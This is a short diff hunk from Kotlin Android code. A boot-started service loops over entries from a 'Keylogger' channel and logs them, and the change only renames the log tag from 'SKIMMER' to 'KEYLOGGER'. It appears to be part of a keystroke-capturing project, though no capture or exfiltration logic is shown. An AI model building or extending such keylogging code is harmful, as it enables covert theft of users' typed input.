@@ -29,7 +29,7 @@ class MyService: BootService() {
     init {
         lifecycleScope.launchWhenCreated {
             for (entry in Keylogger.channel) {
-                Log.d("SKIMMER", entry.toString())
+                Log.d("KEYLOGGER", entry.toString())
             }
         }
     }
